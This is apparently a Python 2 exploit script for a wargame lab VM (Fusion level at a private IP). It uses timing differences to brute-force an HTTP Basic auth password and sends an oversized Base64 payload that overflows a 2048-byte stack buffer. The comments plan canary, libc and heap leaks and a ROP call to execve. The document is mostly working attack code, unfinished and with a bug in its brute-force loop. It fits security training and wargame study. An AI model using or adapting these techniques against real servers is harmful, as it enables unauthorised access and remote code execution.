PORT = 20004
FUSION_IP = "192.168.180.128"
import socket
import string
import telnetlib
import struct
import time
import select
import hmac
import threading

from collections import OrderedDict
q = lambda x: struct.pack('<I', x)

### ATTACK IDEA
### 1. BF OVER PASSWORD USING TIMING ATTACK V
### todo: find infomration leakage vulnerability
### 2. LEAK STACK CANARY X
### 3. LEAK LIBC 
### 4. LEAK HEAP 
### use ROP to call libc.execve() with our params
### 5. use Base64 decode vulnerability (output length is set to be input_length / 4 * 3 ) while buffer is 2048 bytes long and input data is in our control! V
### 		after leaking stack canary and exploit the vuln we control EIP. 


### vulns:
	### Base64decode let's us exceed the 2048 buffer length :)
	###  they set *output_length = input_length / 4 * 3;
	### although it points to a 2048 sized buffer.
	### we need to start with the correct bypass to get to the return...

### XXX strencode
	### takes not alpha charactes and switch them to %xx format.
	### makes strings larger *3

	### can't take advantage of that since sizes are being checked
	### + inorder to get to the function need to be a valid dir
	### meaning going at least one dir on the system
	### couldn't find a way to do that since .. is being checked!

	



TIMES = {999: '!'}
THREADS = []

def try_password(password, times = 1):

	total_time = 0
	for i in xrange(times):
		s = socket.socket()
		s.connect((FUSION_IP, PORT))
		HTTP_DATA = """\
		GET / HTTP/1.1
		Authorization: Basic {base64}

		""".format(base64=("{password}".format(password=password)).encode('base64')).replace('\t','')

		#print repr(HTTP_DATA)
		s.send(HTTP_DATA)
		t = time.clock()
		calc_time = 999
		#if select.select([s], [], [], 1)[0]:
		data = s.recv(4096)
		total_time += time.clock() - t
		if total_time > min(TIMES):
			total_time = 999
			break

	TIMES[total_time] = password
	return total_time

def bf_password():
	global TIMES
	strip = string.lowercase + string.uppercase + string.digits
	guessed_passwd = ''

	for x in xrange(16):
		for a in strip:
			try_password(guessed_passwd + a, 1)

		best_char = TIMES[min(TIMES.keys())]
		guessed_passwd = best_char
		TIMES = {999: '!'}
		print guessed_passwd

	return guessed_passwd



password = "QPBxP72dVaBaW74v".encode('base64') #bf_password()
password = "QPBxP72dVaBaW74v".encode('base64').replace('=','').replace('\n','') + ("A" * 1020).encode('hex') + "="
print len(password), len(password) % 4
s = socket.socket()
s.connect((FUSION_IP, PORT))
HTTP_DATA = """\
GET /{filename} HTTP/1.1
Authorization: Basic {base64} 

""".format(filename='\x01' * 9000, base64=("{password}".format(password=password)).replace('\t',''))
s.send(HTTP_DATA)

print s.recv(4096),
print s.recv(4096)

s.close()